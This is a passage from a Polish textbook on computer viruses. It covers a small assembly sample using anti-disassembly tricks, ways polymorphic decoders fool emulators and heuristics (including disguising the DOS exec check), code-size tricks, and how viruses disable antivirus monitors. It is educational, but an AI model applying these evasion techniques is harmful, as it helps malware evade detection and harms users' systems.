\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; na SS SS : OO OO}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; i nie wykryje ani ADD, ani JMP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     add  ax,0EBh+256*(offset Koniec-$-3)    ; kod tego rozkazu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; to db 05}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ;    db EB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ;    db (offset Koniec-$-3)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; od drugiego bajtu rozpoczyna sie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; kod rozkazu Jmp Koniec (EB,??)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TxCzesc  db  0Dh,0Ah,'Czesc!',0Dh,0Ah,'$'   ; tekst w srodku kodu;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; istnieje szansa, ze}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; deasembler zacznie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; go interpretowac jako kod}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      db  0EAh                               ; ta sama sztuczka co powyzej;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; symulacja wywolania dalekiej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Koniec:                                     ; tu dotrze program omijajac tekst}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jmp  $+3                                ; przeskocz bajt 0EAh}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     db   0EAh                               ; ta sama sztuczka co powyzej;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; symulacja wywolania dalekie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; procedury CALL FAR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; ponizsza sekwencja mov ah,9/}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; int 21h jest 4 bajtowa i jest}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; calkowicie "pochlonieta" przez}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; symulowany rozkaz CALL FAR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov  ah,9                               ; funkcja DOS - wyswietl tekst$}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int  21h                                ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ret                                     ; powrot do PSP:0000h,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; gdzie znajduje sie kod Int 20h,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; czyli koncz program}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ANTY_DEA ENDS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch END Start}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ze wzgl\uc1\u281\'eadu na fakt, i\uc1\u380\'bf wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 obecnie istniej\uc1\u261\'b9cych program\'f3w antywirusowych stosuje tryb krokowy lub te\uc1\u380\'bf emulacj\uc1\u281\'ea procesora do wykrywania wirus\'f3w polimorficznych, tw\'f3rcy wirus\'f3w staraj\uc1\u261\'b9 si\uc1\u281\'ea w jaki\uc1\u347\'9c spos\'f3b utrudni\uc1\u263\'e6 wykrywanie wirus\'f3w tymi metodami.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Specjalnie w tym celu do proced}{\f0\fs24\lang1045{\*\listtag0}ury dekodera, tworzonej przez poli-morficzny generator, dodaje si\uc1\u281\'ea wywo\uc1\u322\'b3ania r\'f3\uc1\u380\'bfnych, wyst\uc1\u281\'eapuj\uc1\u261\'b9cych typowo w zwyk\uc1\u322\'b3ym oprogramowaniu, funkcji przerwa\uc1\u324\'f1 10h, 21h, 16h i innych, a tak\uc1\u380\'bfe umieszcza si\uc1\u281\'ea w niej wywo\uc1\u322\'b3ania procedur. Ciekawym zabiegiem antyemulacyjn}{\f1\fs24\lang1045{\*\listtag0}y}{\f0\fs24\lang1045{\*\listtag0}m s\uc1\u261\'b9 te\uc1\u380\'bf pr\'f3by nadania dekoderowi wygl\uc1\u261\'b9du programu napisanego w j\uc1\u281\'eazykach wysokiego poziomu (posiadaj\uc1\u261\'b9 one charakterystyczne sekwencje kodu na pocz\uc1\u261\'b9tku programu), b\uc1\u261\'b9d\uc1\u378\'9f te\uc1\u380\'bf nadanie plikowi cech np. wewn\uc1\u281\'eatrznie spakowanego programu (np. dodanie sygnatur PKLI}{\f1\fs24\lang1045{\*\listtag0}TE, LZEXE lub innych).}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Po wykryciu wywo\uc1\u322\'b3ania pewnej ilo\uc1\u347\'9cci funkcji obs\uc1\u322\'b3ugiwanych przez przerwania programowe, pr\'f3buj\uc1\u261\'b9cy wgry\uc1\u378\'9f\uc1\u263\'e6 si\uc1\u281\'ea w kod wirusa program antywirusowy zwykle przerywa dalsze poszukiwania i pozostawia plik bez zmian.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ze wzgl\uc1\u281\'eadu na stosowanie przez programy antywirusowe heurysty-cznego wykrywania wirus\'f3w, nowsze wirusy potrafi\uc1\u261\'b9 ju\uc1\u380\'bf poradzi\uc1\u263\'e6 sobie z tego typu metodami, poprzez odpowiedni\uc1\u261\'b9 manipulacj\uc1\u281\'ea kodem, np. tradycjn\uc1\u261\'b9 sekwencj\uc1\u281\'ea:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP AX,4B00h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch mo\uc1\u380\'bfna zakodowa\uc1\u263\'e6 w wirusie jako:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ADD AX,1234h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP AX,4B00h+1234h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch lub}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch XCHG AX,CX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP AX,4B00h XCHG AX,CX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch lub na inn\uc1\u261\'b9, gdy\uc1\u380\'bf mo\uc1\u380\'bfliwo\uc1\u347\'9cci jest tu w zasadzie niesko\uc1\u324\'f1czenie wiele. Gdy podobn\uc1\u261\'b9 operacj\uc1\u281\'ea wykona si\uc1\u281\'ea dla wi\uc1\u281\'eakszo\uc1\u347\'9cci zawartych w wirusie instrukcji, program antywirusowy b\uc1\u281\'eadzie mia\uc1\u322\'b3 spore k\uc1\u322\'b3opoty z rozpoznan}{\f1\fs24\lang1045{\*\listtag0}iem intruza.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 9.3. Optymalizacje kodu}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Jak wspomniano na pocz\uc1\u261\'b9tku, wirus powinien by\uc1\u263\'e6 maksymalnie kr\'f3tki i zwi\uc1\u281\'eaz\uc1\u322\'b3y, tak wi\uc1\u281\'eac autorom wirus\'f3w zwykle zale\uc1\u380\'bfy na minimalizacji kodu wirusa, bez utracenia jego funkcjonalno\uc1\u347\'9cci. W tym celu stosuje si\uc1\u281\'ea r\'f3\uc1\u380\'bfne rozwi\uc1\u261\'b9zania polegaj\uc1\u261\'b9ce na odpowiednim kodowaniu r\'f3\uc1\u380\'bfnych instrukcji, kt\'f3re - mimo, \uc1\u380\'bfe kr\'f3tsze od normal-}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch nie przeznaczonych do danego celu rozkaz\'f3w - zachowuj\uc1\u261\'b9 ich funkcjonalno\uc1\u347\'9c\uc1\u263\'e6. Poni\uc1\u380\'bfsze przyk\uc1\u322\'b3ady ilustruj\uc1\u261\'b9 najbardziej znane i proste optymalizacje kodu:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch XOR REJ16,REJ16          ; zeruj rejestr 16-bitowy za pomoce 2-bajtowego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          ; rozkazu (zamiast 3-bajtowego rozkazu MOV REJ16,0)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch XOR AX,AX                ; zeruj rejestry DX:AX za pomoc\uc1\u261\'b9 dw\'f3ch rozkaz\'f3w CWD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          ; zajmuj\uc1\u261\'b9cych razem 3 bajty (zamiast 4 lub 6 bajt\'f3w)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch XCHG AX,REJ16            ; przenie\uc1\u347\'9c zawarto\uc1\u347\'9c\uc1\u263\'e6 rejestru AX do innego rejestru \tab \tab                    ; 16-bitowego zamiast 2-bajtowej instrukcji MOV BX,AX \tab }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          ; (mo\uc1\u380\'bfna u\uc1\u380\'bfywa\uc1\u263\'e6 tylko w niekt\'f3rych sytuacjach)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INC REJ16                ; dwie 1-bajtowe instrukcje INC }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INC REJ16                ; zamiast jednej 3-bajtowej instrukcji }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ADD REJ16,2 \tab \tab       ; analogicznie dla rozkazu }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SUB REJ16,2 \tab \tab       ; 2xDEC}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 9.4. Retrostruktury (techniki anty-antywirusowe), czyli walka z zainstalowanymi monitorami antywirusowymi}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 z nowoczesnych wirus\'f3w w aktywny spos\'f3b stara si\uc1\u281\'ea walczy\uc1\u263\'e6 z zainstalowanym oprogramowaniem antywirusowym. Wirusy kasuj\uc1\u261\'b9 wi\uc1\u281\'eac pliki z sumami kontrolnymi, modyfikuj\uc1\u261\'b9 znalezione w pami\uc1\u281\'eaci programy antywirusowe, tak aby nie by\uc1\u322\'b3y one aktywne, lub nawet deinstaluj\uc1\u261\'b9 je ca\uc1\u322\'b3kowicie z pami\uc1\u281\'eaci w spos\'f3b niewidoczny dla u\uc1\u380\'bfytkownika.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Co ciekawe, wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 monitor\'f3w antywirusowych, zawieraj\uc1\u261\'b9cych wyrafinowane metody wykrywania niebezpiecznych odwo\uc1\u322\'b3a\uc1\u324\'f1 do plik\'f3w czy sektor\'f3w, nie przyk\uc1\u322\'b3ada \uc1\u380\'bfadnej wagi do ochrony w\uc1\u322\'b3asnego}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch kodu. W kolejnych wersjach programy te maj\uc1\u261\'b9 schematyczn\uc1\u261\'b9 budo' we, a korzystaj\uc1\u261\'b9ce z tego wirusy potrafi\uc1\u261\'b9 wykry\uc1\u263\'e6 odpowiedni\uc1\u261\'b9 sekwencj\uc1\u281\'ea w pami\uc1\u281\'eaci i zmieni\uc1\u263\'e6 j\uc1\u261\'b9 tak, i\uc1\u380\'bf program, mimo \uc1\u380\'bfe jest zainstalowany, nie dzia\uc1\u322\'b3a tak, jak powinien.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Najbardziej jaskrawym tego przyk\uc1\u322\'b3adem jest chyba modyfikacja parametr\'f3w wej\uc1\u347\'9cciowych programu antywirusowego, kt\'f3ry po uruchomieniu wy\uc1\u347\'9cwietla sw\'f3j status, zawieraj\uc1\u261\'b9cy u\uc1\u380\'bfyty przez wirusa parametr. Dodawane przez wirusy parametry najcz\uc1\u281\'ea\uc1\u347\'9cciej wy\uc1\u322\'b3\uc1\u261\'b9czaj\uc1\u261\'b9 bezpo\uc1\u347\'9credni dost\uc1\u281\'eap do dysk\'f3w, przeszukiwanie pami\uc1\u281\'eaci itp. Aby uniemo\uc1\u380\'bfliwi\uc1\u263\'e6 u\uc1\u380\'bfytkownikowi zauwa\uc1\u380\'bfenie wprowadzonych w parametrach zmian, wirusy zmieniaj\uc1\u261\'b9 odpowiedni \uc1\u322\'b3a\uc1\u324\'f1cuch bezpo\uc1\u347\'9crednio w pami\uc1\u281\'eaci ekranu, tak i\uc1\u380\'bf odbior}{\f1\fs24\lang1045{\*\listtag0}c}{\f0\fs24\lang1045{\*\listtag0}a (u\uc1\u380\'bfytkownik programu) patrz\uc1\u261\'b9c na ekran jest przekonany o poprawnym dzia\uc1\u322\'b3aniu programu, mimo \uc1\u380\'bfe ten ma zablokowane funkcje, kt\'f3re prawdopodobnie pomog\uc1\u322\'b3yby wykry\uc1\u263\'e6 wirusa.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch We wspomnianych we wst\uc1\u281\'eapie zinach, dotycz\uc1\u261\'b9cych programowania wirus\'f3w, znale\uc1\u378\'9f\uc1\u263\'e6 mo\uc1\u380\'bfna artyku\uc1\u322\'b3y, kt\'f3re bardzo dok\uc1\u322\'b3adnie opisuj\uc1\u261\'b9 sposoby \uc1\u322\'b3amania najbardziej znanych na \uc1\u347\'9cwiecie program\'f3w antywirusowych (w artyku\uc1\u322\'b3ach tych najcz\uc1\u281\'ea\uc1\u347\'9cciej m\'f3wi si\uc1\u281\'ea o serii zaawansowanych program\'f3w antywirusowych ThunderByte autorstwa Fransa Veldmana).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W najbli\uc1\u380\'bfszych latach spodziewa\uc1\u263\'e6 si\uc1\u281\'ea mo\uc1\u380\'bfna powstania zupe\uc1\u322\'b3nie nowych odmian wirus\'f3w, kt\'f3re wykorzystywa\uc1\u263\'e6 b\uc1\u281\'ead\uc1\u261\'b9 nie znane nam aktualnie mechanizmy. Poni\uc1\u380\'bfej przedstawiono kr\'f3tki przegl\uc1\u261\'b9d przewidywanych przez wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 znawc\'f3w wirus\'f3w trend\'f3w rozwojowych progamowania wirus\'f3w}{\f1\fs24\lang1045{\*\listtag0}.}{\f0\fs24\lang1045{\*\listtag0} Ze wzgl\uc1\u281\'eadu jednak na charakter rozdzia\uc1\u322\'b3u oraz na w\uc1\u261\'b9tpliw\uc1\u261\'b9 wiarygodno\uc1\u347\'9c\uc1\u263\'e6 r\'f3\uc1\u380\'bfnego rodzaju przepowiedni, zalecam czytelnikowi podej\uc1\u347\'9ccie do tego tekstu z odrobin\uc1\u261\'b9 sceptycyzmu.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch ROZDZIA\uc1\u321\'a3 10}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 10.1. Wirusy dla r\'f3\uc1\u380\'bfnych system\'f3w (ang. }{\f1\fs24\i\b\lang1045{\*\listtag0}multisystem, multiplatform viruses}{\f1\fs24\b\lang1045{\*\listtag0})}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Jednym z zada\uc1\u324\'f1, jakie stawiaj\uc1\u261\'b9 sobie obecnie tw\'f3rcy wirus\'f3w, jest stworzenie wirusa, kt\'f3ry m\'f3g\uc1\u322\'b3by egzystowa\uc1\u263\'e6 w jak najwi\uc1\u281\'eakszej ilo\uc1\u347\'9cci system\'f3w operacyjnych (w tym tak\uc1\u380\'bfe sieciowych). Wirus taki powinien infekowa\uc1\u263\'e6 wszystkie mo\uc1\u380\'bfliwe do zara\uc1\u380\'bfenia obiekty, a tak\uc1\u380\'bfe w miar\uc1\u281\'ea mo\uc1\u380\'bfliwo\uc1\u347\'9cci przenosi\uc1\u263\'e6 si\uc1\u281\'ea w sieci, wykorzystuj\uc1\u261\'b9c protoko\uc1\u322\'b3y transmisji sieciowej. Wydaje si\uc1\u281\'ea, i\uc1\u380\'bf ze wzgl\uc1\u281\'eadu na r\'f3\uc1\u380\'bfnice wyst\uc1\u281\'eapuj\uc1\u261\'b9ce pomi\uc1\u281\'eadzy r\'f3\uc1\u380\'bfnymi komputerami i systemami operacyjnymi, najni\uc1\u380\'bfszym poziomem, na jakim b\uc1\u281\'eadzie m\'f3g\uc1\u322\'b3 pracowa\uc1\u263\'e6 ta}{\f1\fs24\lang1045{\*\listtag0}k}{\f0\fs24\lang1045{\*\listtag0}i wirus, b\uc1\u281\'eadzie jaki\uc1\u347\'9c j\uc1\u281\'eazyk programowania wysokiego poziomu, najpewniej C lub podobny. Odpowiedni mo\uc1\u380\'bfe okaza\uc1\u263\'e6 si\uc1\u281\'ea stale rozwijany, do\uc1\u347\'9c\uc1\u263\'e6 popularny j\uc1\u281\'eazyk JAVA, masowo wykorzystywany w sieci Intemet. Poprzez zawarte w nim mechanizmy mo\uc1\u380\'bfna b\uc1\u281\'eadzie zapewne stwo}{\f1\fs24\lang1045{\*\listtag0}r}{\f0\fs24\lang1045{\*\listtag0}zy\uc1\u263\'e6 wirusa, kt\'f3ry b\uc1\u281\'eadzie si\uc1\u281\'ea przemieszcza\uc1\u322\'b3 bez wi\uc1\u281\'eakszych trudno\uc1\u347\'9cci po ca\uc1\u322\'b3ej sieci Internet.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Idea stworzenia wirusa dzia\uc1\u322\'b3aj\uc1\u261\'b9cego na r\'f3\uc1\u380\'bfnych komputerach nie jest wcale tak odleg\uc1\u322\'b3a, jak mo\uc1\u380\'bfna by s\uc1\u261\'b9dzi\uc1\u263\'e6 po przeczytaniu powy\uc1\u380\'bfszego tekstu. Prawdziw\uc1\u261\'b9 niespodziank\uc1\u261\'b9 jest fakt, i\uc1\u380\'bf pierwsze wirusy niezale\uc1\u380\'bfne sprz\uc1\u281\'eatowo ju\uc1\u380\'bf istniej\uc1\u261\'b9 i s\uc1\u261\'b9 to... makrowirusy, kt\'f3re radz\uc1\u261\'b9 sobie zar\'f3wno na komputerach klasy PC, jak i Macintosh,}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 10.2. Wirusy infekuj\uc1\u261\'b9ce wewn\uc1\u261\'b9trzplikowo (ang. }{\f1\fs24\i\b\lang1045{\*\listtag0}surface infectors}{\f1\fs24\b\lang1045{\*\listtag0})}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 obecnie istniej\uc1\u261\'b9cych wirus\'f3w infekuj\uc1\u261\'b9c pliki u\uc1\u380\'bfywa standardowego schematu, polegaj\uc1\u261\'b9cego na doczepianiu si\uc1\u281\'ea na ko\uc1\u324\'f1cu zara\uc1\u380\'bfanego pliku i odpowiedniej modyfikacji jego nag\uc1\u322\'b3\'f3wka. Zara\uc1\u380\'bfanie wewn\uc1\u261\'b9trzplikowe polega na pr\'f3bie odnalezienia i wykorzystania w zara\uc1\u380\'bfanym pliku miejsca, kt\'f3}{\f1\fs24\lang1045{\*\listtag0}r}{\f0\fs24\lang1045{\*\listtag0}e mo\uc1\u380\'bfna by\uc1\u322\'b3oby wykorzysta\uc1\u263\'e6 na umieszczenie przysz\uc1\u322\'b3ego wirusa. Mo\uc1\u380\'bfliwe by\uc1\u322\'b3oby nawet rozrzucenie kodu wirusa po pliku ofiary, tak i\uc1\u380\'bf poszczeg\'f3lne cz\uc1\u281\'ea\uc1\u347\'9cci kodu by\uc1\u322\'b3yby od siebie oddzielone. Ponadto, gdyby wirus tego typu 